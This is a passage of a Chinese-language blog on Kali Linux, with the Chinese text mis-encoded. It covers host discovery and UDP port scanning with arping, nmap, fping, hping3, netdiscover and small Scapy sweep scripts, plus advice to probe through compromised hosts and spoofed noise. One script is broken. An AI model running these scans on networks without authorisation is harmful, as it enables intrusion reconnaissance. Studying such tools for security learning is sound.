<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./pinger2.py [iplist.txt]&quot;</span><br><span class="line">    print &quot;Example - ./pinger2.py iplist.txt&quot;</span><br><span class="line">    print &quot;Example will perform an ICMP ping scan of the 192.168.100.0/24 network&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">filename=str(sys.argv[1])</span><br><span class="line">file=open(filename,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line">for addr in file:</span><br><span class="line">    a=sr1(IP(dst=addr.strip())/ICMP(),timeout=0.1,verbose=0)</span><br><span class="line">    if a==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print addr.strip()</span><br></pre></td></tr></table></figure>

<h4 id="3-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆnmapï¼‰"><a href="#3-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆnmapï¼‰" class="headerlink" title="3. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆnmapï¼‰"></a>3. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆnmapï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€-254 -sn</code></strong>ï¼ˆåŒç½‘æ®µæ˜¯å‘ARPåŒ…ï¼Œä¸åŒç½‘æ®µæ˜¯å‘ICMPåŒ…ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap -iL iplist.txt -sn</code></strong></li>
</ul>
<blockquote>
<pre><code>namp -snå¯¹äºåŒç½‘æ®µæ˜¯å‘ARPåŒ…å’ŒDNSåŒ…ï¼Œä¸åŒç½‘æ®µæ˜¯å‘ICMPåŒ…ï¼ˆè¯·æ±‚å­—æ®µä¸ºæ—¶é—´æˆ³13å’Œè¯·æ±‚åŒ…8ï¼‰ã€DNSåŒ…å’ŒTCPåŒ… </code></pre></blockquote>
<h4 id="4-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆfpingï¼‰"><a href="#4-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆfpingï¼‰" class="headerlink" title="4. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆfpingï¼‰"></a>4. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆfpingï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfping IPåœ°å€ -c 1</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfping -g èµ·å§‹IPåœ°å€ æœ€åIPåœ°å€ï¼ˆIPåœ°å€æ®µï¼‰-c 1</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfping -g IPç½‘æ®µ/24</code></strong>  â–²2019.12.2è¿‡æ»¤è¾“å‡ºæ ¼å¼ä¸å¯¹</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfping -f iplist.txt</code></strong></li>
</ul>
<h4 id="5-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆHpingï¼‰"><a href="#5-å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆHpingï¼‰" class="headerlink" title="5. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆHpingï¼‰"></a>5. å‘ç°-ä¸‰å±‚å‘ç°ï¼ˆHpingï¼‰</h4><ul>
<li>Hpingï¼ˆå‡ ä¹å¯ä»¥å®Œæˆæ‰€ä»¥IPã€TCPåè®®åŒ…å¤´çš„ç»„åˆï¼Œä¹Ÿå¯å¯¹äºåŸºäºTCPæœåŠ¡å™¨è¿›è¡Œå‹åŠ›æµ‹è¯•ï¼‰<ul>
<li>èƒ½å¤Ÿå‘ç”Ÿå‡ ä¹æ‰€æœ‰ä»»æ„TCP/IPåŒ…</li>
<li>åŠŸèƒ½å¼ºå¤§ä½†æ¯æ¬¡åªèƒ½æ‰«æä¸€ä¸ªç›®æ ‡</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šhping3 IPåœ°å€ --icmp -c 2</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šfor addr in $(seq 1 254); do hping3 1.1.1.$addr --icmp -c 1 &gt;&gt; handle.txt &amp; done</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šcat handle.txt |  grep ^len</code></strong></li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E5%9B%9B)%EF%BC%9A%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0--%E4%BA%8C%E5%B1%82%E5%8F%91%E7%8E%B0/" itemprop="url">Kali Linuxç¬”è®°(åå››)ï¼šä¸»æœºå‘ç°--äºŒå±‚å‘ç°</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  1.2k å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  5 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"><a href="#1-ä¸»åŠ¨ä¿¡æ¯æ”¶é›†" class="headerlink" title="1. ä¸»åŠ¨ä¿¡æ¯æ”¶é›†"></a>1. ä¸»åŠ¨ä¿¡æ¯æ”¶é›†</h4><ul>
<li>ç›´æ¥ä¸ç›®æ ‡ç³»ç»Ÿäº¤äº’é€šä¿¡</li>
<li>æ— æ³•é¿å…ç•™ä¸‹è®¿é—®çš„ç—•è¿¹ï¼ˆå¯èƒ½è¢«å°æ€ï¼Œå¼ºçš„æµé‡åˆ†æï¼Œå¼ºçš„ä»£ç å®¡è®¡ï¼‰</li>
<li>ä½¿ç”¨å—æ§çš„ç¬¬ä¸‰æ–¹ç”µè„‘è¿›è¡Œæ¢æµ‹<ul>
<li>ä½¿ç”¨ä»£ç†æˆ–å·²è¢«æ§åˆ¶çš„ä¸»æœº</li>
<li>åšå¥½è¢«å°æ€çš„å‡†æœ¬</li>
<li>ä½¿ç”¨å™ªå£°è¿·æƒ‘ç›®æ ‡ï¼Œæ·¹æ²¡çœŸå®çš„æ¢æµ‹æµé‡ï¼ˆä¼ªé€ IPå‘é€å¤§é‡åƒåœ¾ä¿¡æ¯ï¼‰</li>
</ul>
</li>
<li>æ‰«æï¼ˆIPå±‚ â†’ ç«¯å£å±‚ â†’ æœåŠ¡çº§åˆ«çš„æ‰«æï¼‰<ul>
<li>å‘é€ä¸åŒçš„æ¢æµ‹ï¼Œæ ¹æ®ç»“æœåˆ¤æ–­ç›®æ ‡çŠ¶æ€</li>
</ul>
</li>
</ul>
<h4 id="2-å‘ç°ï¼ˆIPå±‚-â†’-ç«¯å£å±‚-â†’-æœåŠ¡çº§åˆ«çš„æ‰«æï¼‰"><a href="#2-å‘ç°ï¼ˆIPå±‚-â†’-ç«¯å£å±‚-â†’-æœåŠ¡çº§åˆ«çš„æ‰«æï¼‰" class="headerlink" title="2. å‘ç°ï¼ˆIPå±‚ â†’ ç«¯å£å±‚ â†’ æœåŠ¡çº§åˆ«çš„æ‰«æï¼‰"></a>2. å‘ç°ï¼ˆIPå±‚ â†’ ç«¯å£å±‚ â†’ æœåŠ¡çº§åˆ«çš„æ‰«æï¼‰</h4><ul>
<li>è¯†åˆ«æ´»ç€çš„ä¸»æœº<ul>
<li>æ½œåœ¨çš„è¢«æ”»å‡»ç›®æ ‡ï¼ˆå­˜åœ¨çš„æ¼æ´æ¥è¿›è¡Œåˆ©ç”¨ï¼‰</li>
</ul>
</li>
<li>è¾“å‡ºä¸€ä¸ªIPåœ°å€åˆ—è¡¨ï¼ˆåœ¨çº¿IPåœ°å€ï¼‰</li>
<li>2ã€3ã€4å±‚å‘ç°</li>
</ul>
<h4 id="3-å‘ç°-äºŒå±‚å‘ç°ï¼ˆarpingï¼‰"><a href="#3-å‘ç°-äºŒå±‚å‘ç°ï¼ˆarpingï¼‰" class="headerlink" title="3. å‘ç°-äºŒå±‚å‘ç°ï¼ˆarpingï¼‰"></a>3. å‘ç°-äºŒå±‚å‘ç°ï¼ˆarpingï¼‰</h4><ul>
<li>ä¼˜ç‚¹ï¼šæ‰«æé€Ÿåº¦å¿«ã€å¯é </li>
<li>ç¼ºç‚¹ï¼šä¸å¯è·¯ç”±ï¼ˆåªå¯å‘ç°æœ¬ç½‘æ®µçš„ä¸»æœºå‘ç°ï¼‰</li>
<li>Arpåè®®<ul>
<li>æŠ“åŒ…</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>OSIæ¨¡å‹
Layer1 Physical
Layer2 Data Link       ARP
Layer3 Network         IPv4,IPv6,ICMP,and IPSec
Layer4 Transport       TCP and UDP
Layer5 Session         NetBIOS,PPTP,RPC,and SOCKS
Layer6 Presentation    ASCII,JPEG,PDF,PNG,and DOCX
Layer7 Application     HTTP,FTP,and Telnet</code></pre></blockquote>
<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šarping</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šarping IPåœ°å€ -c 1</code></strong>ï¼ˆå‘é€ä¸€ä¸ªARPåŒ…ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šarping IPåœ°å€ -d</code></strong>ï¼ˆå‘ç°é‡å¤IPåœ°å€æ‹¥æœ‰ä¸€ä¸ªMACåœ°å€ï¼Œå¯ä»¥å‘ç°arpåœ°å€æ¬ºéª—ï¼‰</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šarping -c 1 Ipåœ°å€ | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</code></strong></li>
<li>è„šæœ¬ â–²2019.12.2æ–°ç‰ˆifconfigå‘½ä»¤æ˜¾ç¤ºä¸åŒï¼Œå¯¹ç›¸åº”è„šæœ¬è¿›è¡Œä¿®æ”¹<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./arping1.sh eth0 &gt;iplist.txt</code></strong>ï¼ˆæ£€æŸ¥ç½‘å†…â€å­˜æ´»â€çš„è®¡ç®—æœºï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#ï¼/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [interface]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh eth0&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    exit</span><br><span class="line">fi</span><br><span class="line">interface=$1</span><br><span class="line">prefix=$(ifconfig $interface | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &apos;&#123;print $2&#125;&apos;)</span><br><span class="line">for addr in $(seq 1 254);do</span><br><span class="line">    arping -c 1 $prefix.$addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<ul>
<li>è„šæœ¬ <ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./arping2.sh iplist.txt</code></strong>ï¼ˆé‡æ–°æ£€æŸ¥â€å­˜æ´»â€çš„ä¸»æœºï¼‰</li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">#ï¼/bin/bash</span><br><span class="line">if [ &quot;$#&quot; -ne 1 ];then</span><br><span class="line">    echo &quot;USAGE - ./arping.sh [iplist.txt]&quot;</span><br><span class="line">    echo &quot;Example - ./arping.sh iplist.txt&quot;</span><br><span class="line">    echo &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">fi</span><br><span class="line">file=$1</span><br><span class="line">for addr in $(cat $file); do</span><br><span class="line">    arping -c 1 $addr | grep &quot;bytes from&quot; | cut -d &quot; &quot; -f 5 | cut -d &quot;(&quot; -f 2 | cut -d &quot;)&quot; -f 1</span><br><span class="line">done</span><br></pre></td></tr></table></figure>

<h4 id="4-å‘ç°-äºŒå±‚å‘ç°ï¼ˆNetdiscoverï¼‰"><a href="#4-å‘ç°-äºŒå±‚å‘ç°ï¼ˆNetdiscoverï¼‰" class="headerlink" title="4. å‘ç°-äºŒå±‚å‘ç°ï¼ˆNetdiscoverï¼‰"></a>4. å‘ç°-äºŒå±‚å‘ç°ï¼ˆNetdiscoverï¼‰</h4><ul>
<li>Netdiscoverï¼ˆæ”¯æŒCIDRåœ°å€æ®µæ˜¾ç¤ºï¼‰â–²2019.12.2å¯æŠ“åˆ°åŒ…ï¼Œä½†ç•Œé¢ä¸æ˜¾ç¤º<ul>
<li>ä¸“é—¨ç”¨äºäºŒå±‚å‘ç°</li>
<li>å¯ç”¨äºæ— çº¿å’Œäº¤æ¢ç½‘ç»œç¯å¢ƒ</li>
<li>ä¸»åŠ¨å’Œè¢«åŠ¨æ¢æµ‹</li>
</ul>
</li>
<li>ä¸»åŠ¨<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnetdiscover -i eth0 -r IPåœ°å€/24</code></strong></li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnetdiscover -l iplist.txt</code></strong></li>
</ul>
</li>
<li>è¢«åŠ¨ï¼ˆæŠŠç½‘å¡åˆ¶æˆæ··æ‚æ¨¡å¼è¿›è¡Œç›‘å¬ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnetdiscover -p</code></strong></li>
<li>ä¸»åŠ¨arpå®¹æ˜“è§¦å‘æŠ¥è­¦</li>
</ul>
</li>
</ul>
<h4 id="5-å‘ç°-äºŒå±‚å‘ç°ï¼ˆScapyï¼‰"><a href="#5-å‘ç°-äºŒå±‚å‘ç°ï¼ˆScapyï¼‰" class="headerlink" title="5. å‘ç°-äºŒå±‚å‘ç°ï¼ˆScapyï¼‰"></a>5. å‘ç°-äºŒå±‚å‘ç°ï¼ˆScapyï¼‰</h4><ul>
<li>Scapy<ul>
<li>ä½œä¸ºPythonåº“è¿›è¡Œè°ƒç”¨</li>
<li>ä¹Ÿå¯ä»¥ä½œä¸ºå•ç‹¬çš„å·¥å…·ä½¿ç”¨</li>
<li>æŠ“åŒ…ã€åˆ†æã€åˆ›å»ºã€ä¿®æ”¹ã€æ³¨å…¥ç½‘ç»œæµé‡</li>
</ul>
</li>
<li>apt-get install python3-gnuplotï¼ˆæŠ¥é”™å¯å®‰è£…ï¼‰â–²2019.12.2ä¾ç„¶ä¼šæŠ¥é”™ï¼Œä½†ä¸å½±å“ä½¿ç”¨</li>
<li>Scapy<ul>
<li>arp=ARPï¼ˆï¼‰</li>
<li>arp.pdst=â€IPåœ°å€â€ï¼ˆè¿›è¡Œèµ‹å€¼ï¼‰</li>
<li>answer=sr1(arp)ï¼ˆå‘ç”Ÿæ•°æ®åŒ…ï¼‰</li>
<li>answer.display() ï¼ˆæ˜¾ç¤ºæ•°æ®åŒ…çš„ç»“æ„ï¼Œåˆ†å±‚ï¼‰</li>
</ul>
</li>
</ul>
<blockquote>
<pre><code>ARP().dispaly()ï¼ˆå®šåˆ¶ä¸€ä¸ªARPçš„æ•°æ®åŒ…ï¼Œåªéœ€è¦æ·»åŠ å±æ€§å­—æ®µï¼ŒARPçš„åŒ…å¤´ç»“æ„ï¼‰
sr1()ï¼ˆå‘é€æ•°æ®åŒ…ï¼‰</code></pre></blockquote>
<ul>
<li>pythonè„šæœ¬ï¼ˆç”¨Scapyå†™çš„pythonè„šæœ¬ï¼‰<ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./Arp1.py æ¥å£</code></strong> â–²2019.12.1 strip()å‡½æ•°æŠ¥é”™</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./Arp2.py iplist.txt</code></strong></li>
</ul>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./Arp1.py [interface]&quot;</span><br><span class="line">    print &quot;Example - ./Arp1.py eth0&quot;</span><br><span class="line">    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">interface=str(sys.argv[1])</span><br><span class="line"></span><br><span class="line">ip=subprocess.check_output(&quot;ifconfig &quot;+interface+&quot; | grep &quot;inet&quot; | egrep -v &quot;inet6&quot; | cut -d &quot;.&quot; -f 1-3 | awk &apos;&#123;print $2&#125;&apos;&quot;,shell=True).strip()</span><br><span class="line">prefix=ip.split(&quot;.&quot;)[0]+&quot;.&quot;+ip.split(&quot;.&quot;)[1]+&quot;.&quot;+ip.split(&quot;.&quot;)[2]+&quot;.&quot;</span><br><span class="line">for addr in range(0,254):</span><br><span class="line">    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)</span><br><span class="line">    if answer==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print prefix+str(addr)</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import logging</span><br><span class="line">import subprocess</span><br><span class="line">logging.getLogger(&quot;scapy.runtime&quot;).setLevel(logging.ERROR)</span><br><span class="line">from scapy.all import *</span><br><span class="line"></span><br><span class="line">if len(sys.argv)!=2:</span><br><span class="line">    print &quot;Usage - ./Arp2.py [iplist.txt]&quot;</span><br><span class="line">    print &quot;Example - ./Arp2.py iplist.txt&quot;</span><br><span class="line">    print &quot;Example will perform an ARP scan of the local subnet to which eth0 is assigned&quot;</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line">filename=str(sys.argv[1])</span><br><span class="line">file=open(filename,&quot;r&quot;)</span><br><span class="line"></span><br><span class="line">for addr in file:</span><br><span class="line">    answer=sr1(ARP(pdst=addr.strip()),timeout=0.1,verbose=1)</span><br><span class="line">    if answer==None:</span><br><span class="line">      pass</span><br><span class="line">    else:</span><br><span class="line">      print addr.strip()</span><br></pre></td></tr></table></figure>

<h4 id="6-å‘ç°-äºŒå±‚å‘ç°ï¼ˆnmapï¼‰"><a href="#6-å‘ç°-äºŒå±‚å‘ç°ï¼ˆnmapï¼‰" class="headerlink" title="6. å‘ç°-äºŒå±‚å‘ç°ï¼ˆnmapï¼‰"></a>6. å‘ç°-äºŒå±‚å‘ç°ï¼ˆnmapï¼‰</h4><ul>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnmap IPåœ°å€-254ï¼ˆIPåœ°å€/24ï¼‰ -sn</code></strong> </li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼šnamp -iLï¼ˆè°ƒç”¨åœ°å€åˆ—è¡¨çš„æ–‡æœ¬æ–‡ä»¶ï¼‰ iplist.txt -sn | grep ^Namp</code></strong></li>
</ul>
<blockquote>
<pre><code>å¼ºå¤§çš„NMAPè½¯ä»¶ï¼Œéœ€è¦éå¸¸ç†Ÿç»ƒ
nmapçš„-snå‚æ•°ï¼Œé™¤äº†ä¼šARPå‘ç°ä¹‹å¤–ï¼Œè¿˜ä¼šè¿›è¡ŒDNSçš„åå‘åŸŸåè§£æ</code></pre></blockquote>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--UDP/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2019/12/10/Kali%20Linux%E7%AC%94%E8%AE%B0(%E5%8D%81%E4%B8%83)%EF%BC%9A%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F--UDP/" itemprop="url">Kali Linuxç¬”è®°(åä¸ƒ)ï¼šç«¯å£æ‰«æ--UDP</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">å‘è¡¨äº</span>
              
              <time title="åˆ›å»ºäº" itemprop="dateCreated datePublished" datetime="2019-12-10T08:13:38+08:00">
                2019-12-10
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">åˆ†ç±»äº</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">å­—æ•°ç»Ÿè®¡&#58;</span>
                
                <span title="å­—æ•°ç»Ÿè®¡">
                  367 å­—
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">é˜…è¯»æ—¶é•¿ &asymp;</span>
                
                <span title="é˜…è¯»æ—¶é•¿">
                  1 åˆ†é’Ÿ
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-ç«¯å£æ‰«æï¼ˆUDPï¼‰"><a href="#1-ç«¯å£æ‰«æï¼ˆUDPï¼‰" class="headerlink" title="1. ç«¯å£æ‰«æï¼ˆUDPï¼‰"></a>1. ç«¯å£æ‰«æï¼ˆUDPï¼‰</h4><ul>
<li>ç«¯å£å¯¹åº”ç½‘ç»œæœåŠ¡åŠåº”ç”¨ç«¯ç¨‹åº</li>
<li>æœåŠ¡ç«¯ç¨‹åºçš„æ¼æ´é€šè¿‡ç«¯å£æ”»å…¥</li>
<li>å‘ç°å¼€æ”¾çš„ç«¯å£</li>
<li>æ›´å…·ä½“çš„æ”»å‡»é¢</li>
<li>UDPç«¯å£<ul>
<li>å‡è®¾ICMP port-unreachable å“åº”ä»£è¡¨ç«¯å£å…³é—­ï¼ˆæ²¡æœ‰å“åº”ï¼Œå³ä¸ºç«¯å£å¼€æ”¾ï¼‰</li>
<li>ç›®æ ‡ç³»ç»Ÿä¸å“åº”ICMP port-unreachableæ—¶ï¼Œå¯èƒ½äº§ç”Ÿè¯¯åˆ¤</li>
</ul>
</li>
<li>å®Œæ•´çš„UDPåº”ç”¨å±‚è¯·æ±‚<ul>
<li>å‡†ç¡®æ€§é«˜</li>
<li>è€—æ—¶å·¨å¤§</li>
</ul>
</li>
</ul>
<h4 id="2-ç«¯å£æ‰«æï¼ˆScapy-UDPï¼‰"><a href="#2-ç«¯å£æ‰«æï¼ˆScapy-UDPï¼‰" class="headerlink" title="2. ç«¯å£æ‰«æï¼ˆScapy-UDPï¼‰"></a>2. ç«¯å£æ‰«æï¼ˆScapy-UDPï¼‰</h4><ul>
<li>Scapy UDP Scan<ul>
<li>ç«¯å£å…³é—­ï¼šICMP port-unreachable</li>
<li>ç«¯å£å¼€æ”¾ï¼šæ²¡æœ‰å›åŒ…</li>
<li>äº†è§£æ¯ä¸€ç§åŸºäºUDPçš„åº”ç”¨åŒ…ç»“æ„å¾ˆæœ‰å¸®åŠ©</li>
<li>ä¸ä¸‰å±‚ç›¸åŒçš„æŠ€æœ¯</li>
<li>è¯¯åˆ¤</li>
</ul>
</li>
<li>Scapy<ul>
<li>sr1(IP(dst=â€IPåœ°å€â€)/UDP(dport=53),timeout=1,verbose=1)</li>
</ul>
</li>
<li><strong><code>ğŸ”ºå‘½ä»¤ï¼š./udp_scan.py IPåœ°å€ èµ·å§‹ç«¯å£ ç»“æŸç«¯å£</code></strong></li>
</ul>
